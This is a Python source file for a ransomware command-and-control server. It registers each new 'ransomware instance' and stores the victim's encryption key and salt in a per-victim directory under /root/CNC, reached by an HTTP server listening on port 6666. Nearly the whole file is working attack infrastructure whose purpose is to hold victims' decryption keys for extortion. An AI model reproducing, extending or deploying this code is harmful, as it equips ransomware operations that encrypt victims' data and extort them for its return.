import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path: str, params: dict, body: dict) -> dict:
        # used to register new ransomware instance
        if body:
            try:
                # Decode the base64 data
                salt = base64.b64decode(body["salt"])
                key = base64.b64decode(body["key"])
                token = base64.b64decode(body["token"])

                # Compute the hash of the token to create a directory for the victim
                hashed_token = sha256(token).hexdigest()
                victim_dir = os.path.join(CNC.ROOT_PATH, hashed_token)
                os.makedirs(victim_dir, exist_ok=True)

                # Save the salt and key in the victim's directory
                with open(os.path.join(victim_dir, "salt.bin"), "wb") as salt_file:
                    salt_file.write(salt)
                with open(os.path.join(victim_dir, "key.bin"), "wb") as key_file:
                    key_file.write(key)

                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                return {"status": "OK"}
            except Exception as e:
                self.send_response(400)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                return {"status": "ERROR", "message": str(e)}
        else:
            self.send_response(400)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            return {"status": "ERROR", "message": "Empty request body"}

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()